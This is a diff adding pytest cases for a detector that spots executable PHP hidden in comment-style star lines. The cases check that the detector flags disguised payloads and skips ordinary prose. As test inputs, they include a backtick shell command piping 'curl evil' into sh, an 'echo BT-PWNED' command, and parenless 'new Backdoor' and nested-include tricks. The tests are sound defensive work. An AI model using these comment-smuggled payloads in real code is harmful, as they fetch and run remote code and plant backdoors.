@@ -509,3 +509,66 @@ class TestStarLinePayloadGuard:
         assert not _php_interstitial_is_handler(
             "* Sanitizes the output buffer.\n"
             "* and trims trailing whitespace.\n")
+
+
+class TestStarProseAllowlist:
+    """The star-line skip is a PROSE-SHAPE allowlist, not a
+    capability-character blocklist: a line skips only when it carries
+    none of the characters that can form, feed, or terminate an
+    expression statement AND no parenless expression-head keyword.
+    Every spelling here executes (or outputs) on a stock interpreter
+    while carrying no ``$`` and no paren."""
+
+    def test_backtick_shell_execution(self):
+        assert _php_interstitial_is_handler(
+            "include '1'\n* `echo BT-PWNED >&2; echo 2`;\n")
+        assert _php_interstitial_is_handler(
+            "include '1'\n* `curl evil | sh`;\n")
+
+    def test_backtick_with_empty_post_tag_remainder(self):
+        assert _php_interstitial_is_handler(
+            "include '1'\n* `cmd` ?>\n")
+
+    def test_parenless_constructor(self):
+        assert _php_interstitial_is_handler(
+            "include '1'\n* new Backdoor;\n")
+
+    def test_parenless_nested_include(self):
+        assert _php_interstitial_is_handler(
+            "include '1'\n* include 'e2.php';\n")
+
+    def test_split_terminator_parenless_constructor(self):
+        # The terminator lands on its own line (which yields only
+        # empty statements) — the keyword arm of the allowlist is
+        # what catches the first line.
+        assert _php_interstitial_is_handler(
+            "include '1'\n* new Backdoor\n;\n")
+        assert _php_interstitial_is_handler(
+            "include '1'\n* 1 + new Backdoor\n;\n")
+
+    def test_keyword_match_is_case_insensitive_and_whole_word(self):
+        # PHP keywords are case-insensitive; word forms like
+        # "includes"/"news" are prose, not keywords.
+        assert _php_interstitial_is_handler(
+            "include '1'\n* NEW Backdoor\n;\n")
+        assert not _php_interstitial_is_handler(
+            "* news that includes prints of yields.\n")
+
+    def test_priced_prose_false_positives(self):
+        # Documented cost of the allowlist: code-looking prose flips
+        # its span to one review slot each (inclusion, the cheap
+        # direction).
+        assert _php_interstitial_is_handler("* run `make check`\n")
+        assert _php_interstitial_is_handler("* {@inheritdoc}\n")
+        assert _php_interstitial_is_handler(
+            "* stops here; then continues.\n")
+        assert _php_interstitial_is_handler(
+            "* Returns the new instance.\n")
+
+    def test_bare_prose_still_skips(self):
+        assert not _php_interstitial_is_handler(
+            "* Sanitizes the output buffer.\n"
+            "* See also: RFC 2822 for details.\n"
+            "* @return int\n"
+            "*/\n"
+            "include('a.php');\n")
